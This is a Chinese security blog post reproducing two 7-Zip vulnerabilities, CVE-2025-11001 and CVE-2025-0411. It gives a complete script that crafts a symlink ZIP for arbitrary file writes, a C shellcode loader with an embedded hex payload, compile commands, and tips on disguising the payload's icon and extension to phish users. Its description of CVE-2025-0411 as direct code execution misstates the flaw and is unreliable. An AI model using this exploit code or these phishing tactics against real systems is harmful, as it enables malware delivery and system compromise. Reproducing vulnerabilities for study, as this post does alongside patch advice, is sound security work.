---
title: 7zip漏洞复现合集
slug: 7ziplou-dong-fu-xian-he-ji
cover: ""
categories:
  - 漏洞复现
tags:
  - 7zip
  - zip
halo:
  site: http://www.hzhsec.top
  name: f674a903-16d6-4667-b9f6-8843367f493d
  publish: true
---

**概述**
7-Zip 是一款广泛使用的开源文件压缩/解压缩工具。由于其高普及率，其安全漏洞一旦被利用，影响范围极广。本笔记记录了近期两个高危漏洞（CVE-2025-11001 与 CVE-2025-0411）的复现过程、原理分析与安全建议。

**环境搭建**
- **目标版本**：7-Zip 24.09
- **下载地址**：https://baixe.net/zh/7-zip/versions
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251212184545.png)

---

### CVE-2025-11001：符号链接导致的任意文件写入漏洞

#### 漏洞背景与介绍
该漏洞存在于 7-Zip 处理 ZIP 压缩包内符号链接（Symbolic Link）的过程中。攻击者可以构造一个特殊的ZIP文件，其中包含指向目标目录的符号链接。当用户（尤其是具有管理员权限的用户）使用易受攻击版本的 7-Zip 解压此文件时，恶意文件会被写入符号链接所指向的任意系统路径，从而实现任意文件写入，可能导致权限提升或系统被控制。

- **影响版本**：21.02 至 24.09 版本。
- **漏洞类型**：路径遍历/任意文件写入。

#### 复现步骤

1.  **准备利用脚本**
利用脚本来自 GitHub: https://github.com/pacbypass/CVE-2025-11001

2.  **生成恶意ZIP文件**
使用以下命令生成恶意压缩包。其中 `-t` 参数指定了恶意文件最终要写入的目标路径。
```bash
python3 exploit.py -t "需要存放恶意文件路径" -o demo.zip -f calc.exe(替换为恶意文件)
```
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图%202025-12-12%20185947.png)

**示例**：将 `eval.exe` 写入桌面 `out` 文件夹。
```bash
python exp.py -t "C:\Users\username\Desktop\out" -f "eval.exe" -o eval.zip
```

3.  **触发漏洞**
使用**管理员身份**运行 7-Zip，并解压生成的 `eval.zip` 文件。
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251212190319.png)

4.  **验证结果**
解压后，检查目标路径，确认恶意文件已被成功写入。
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251212190640.png)

#### 利用脚本源码


```python
import argparse
import os
import time
import zipfile

def add_dir(z, arcname):
    if not arcname.endswith('/'):
        arcname += '/'
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o040755 << 16) | 0x10
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, b'')

def add_symlink(z, arcname, target):
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o120777 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, target.encode('utf-8'))

def add_file_from_disk(z, arcname, src_path):
    with open(src_path, 'rb') as f:
        payload = f.read()
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o100644 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, payload)

def main():
    parser = argparse.ArgumentParser(
        description="Crafts a zip that exploits CVE-2025-11001."
    )
    parser.add_argument(
        "--zip-out", "-o",
        required=True,
        help="Path to the output ZIP file."
    )
    parser.add_argument(
        "--symlink-target", "-t",
        required=True,
        help="Destination path the symlink points to - specify a \"C:\" path"
    )
    parser.add_argument(
        "--data-file", "-f",
        required=True,
        help="Path to the local file to embed e.g an executable or bat script."
    )
    parser.add_argument(
        "--dir-name",
        default="data",
        help="Top-level directory name inside the ZIP (default: data)."
    )
    parser.add_argument(
        "--link-name",
        default="link_in",
        help="Symlink entry name under the top directory (default: link_in)."
    )
    args = parser.parse_args()

    top_dir = args.dir_name.rstrip("/")
    link_entry = f"{top_dir}/{args.link_name}"
    embedded_name = os.path.basename(args.data_file)
    file_entry = f"{link_entry}/{embedded_name}"

    with zipfile.ZipFile(args.zip_out, "w") as z:
        add_dir(z, top_dir)
        add_symlink(z, link_entry, args.symlink_target)
        add_file_from_disk(z, file_entry, args.data_file)

    print(f"Wrote {args.zip_out}")

if __name__ == "__main__":
    main()
```

---

### CVE-2025-0411：双重压缩导致的代码执行漏洞

#### 漏洞背景与介绍
该漏洞源于 7-Zip 对经过双重压缩（例如，一个可执行文件被压缩进ZIP，然后该ZIP再被压缩一次）的特殊文件处理逻辑存在缺陷。在解压此类文件时，7-Zip 可能会错误地执行内嵌的可执行文件，而不仅仅是解压它。这为攻击者提供了一种绕过某些安全警告（如“打开此文件前总是询问”）的代码执行方式。

- **影响版本**：所有早于 24.09 的版本。
- **漏洞类型**：逻辑缺陷/任意代码执行。

#### 复现步骤

1.  **准备恶意负载**
编写一个加载 Shellcode 的简易加载器（Loader）。以下示例使用弹出计算器的 Shellcode。
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
	DWORD oldprotect = 0;
	unsigned char p[] = {			"\x48\x81\xEC\x00\x01\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x8B\x40\x30\x48\x8B\x70\x10\x48\x8B\x58\x40\x48\x8B\x00\x81\x7B\x0C\x33\x00\x32\x00\x75\xEC\x48\x8B\xCE\x48\xC7\xC2\x32\x74\x91\x0C\xE8\xC0\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC3\x6C\x6C\x00\x00\x53\x48\xBB\x75\x73\x65\x72\x33\x32\x2E\x64\x53\x48\x8B\xCC\x48\x83\xEC\x18\x41\xFF\xD6\x48\x8B\xD8\x48\x8B\xCB\x48\xC7\xC2\x6A\x0A\x38\x1E\xE8\x8E\x00\x00\x00\x4C\x8B\xF0\x4D\x33\xC9\x4D\x33\xC0\x48\x33\xD2\x48\x33\xC9\x41\xFF\xD6\x48\x8B\xCE\x48\xC7\xC2\x51\x2F\xA2\x01\xE8\x6D\x00\x00\x00\x4C\x8B\xF0\x48\x33\xC0\x50\x48\xB8\x63\x61\x6C\x63\x2E\x65\x78\x65\x50\x48\x8B\xCC\x48\x83\xEC\x20\x48\xC7\xC2\x01\x00\x00\x00\x41\xFF\xD6\x48\x8B\xCE\x48\xBA\x85\xDF\xAF\xBB\x00\x00\x00\x00\xE8\x38\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC0\x61\x64\x00\x00\x50\x48\xB8\x45\x78\x69\x74\x54\x68\x72\x65\x50\x48\x8B\xCE\x48\x8B\xD4\x48\x83\xEC\x20\x41\xFF\xD6\x4C\x8B\xF0\x48\x81\xC4\x88\x01\x00\x00\x48\x83\xEC\x18\x48\x33\xC9\x41\xFF\xD6\xC3\x48\x83\xEC\x40\x56\x48\x8B\xFA\x48\x8B\xD9\x48\x8B\x73\x3C\x48\x8B\xC6\x48\xC1\xE0\x36\x48\xC1\xE8\x36\x48\x8B\xB4\x03\x88\x00\x00\x00\x48\xC1\xE6\x20\x48\xC1\xEE\x20\x48\x03\xF3\x56\x8B\x76\x20\x48\x03\xF3\x48\x33\xC9\xFF\xC9\xFF\xC1\xAD\x48\x03\xC3\x33\xD2\x80\x38\x00\x74\x0F\xC1\xCA\x07\x51\x0F\xBE\x08\x03\xD1\x59\x48\xFF\xC0\xEB\xEC\x3B\xD7\x75\xE0\x5E\x8B\x56\x24\x48\x03\xD3\x0F\xBF\x0C\x4A\x8B\x56\x1C\x48\x03\xD3\x8B\x04\x8A\x48\x03\xC3\x5E\x48\x83\xC4\x40\xC3"
	};
	unsigned int len = sizeof(p);
	void * payload_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(payload_mem, p, len);
	BOOL rv = VirtualProtect(payload_mem, len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}
```

2.  **编译生成可执行文件**
```bash
x86_64-w64-mingw32-g++ .\loader.cpp -o loader.exe -s
# 或
gcc .\loader.cpp -o loader.exe -s
```

3.  **构造恶意ZIP文件**
使用 7-Zip 对 `loader.exe` 进行**两次压缩**。
- 第一次压缩：`loader.exe` -> `loader.zip`
- 第二次压缩：`loader.zip` -> `loader_2.zip`
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251212192542.png)
最终得到的 `loader_2.zip` 即为恶意文件。

4.  **触发漏洞**
使用易受攻击的 7-Zip（版本 < 24.09）直接打开 `loader_2.zip`。在某些情况下，内嵌的 `loader.exe` 可能会被直接执行。
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251212192709.png)

#### 漏洞利用评价与拓展
此漏洞的利用条件相对苛刻（需要用户使用旧版7-Zip打开双重压缩包），在实际攻击中可能略显“鸡肋”。攻击者通常会结合**钓鱼手段**进行利用，例如：
- 修改压缩包内文件的**图标**和**后缀名**（如改为 `.txt` 或 `.jpg`），增加迷惑性。
- 将恶意压缩包作为邮件附件或网站下载链接传播，诱骗用户打开。
因此，该漏洞在组合利用的钓鱼场景中仍具威胁。

---

### 安全建议
1.  **立即更新**：将 7-Zip 升级到 **24.09 以上或更高版本**，以修复上述漏洞。
2.  **最小权限原则**：避免使用管理员权限运行 7-Zip 进行日常解压操作。
3.  **保持警惕**：不要打开来源不明的压缩文件，尤其是提示结构异常的文件。
4.  **启用安全设置**：在 7-Zip 或系统设置中，确保“打开此文件前总是询问”等安全选项被启用。
5.  **纵深防御**：使用终端安全软件，并保持操作系统和其他软件的最新状态。

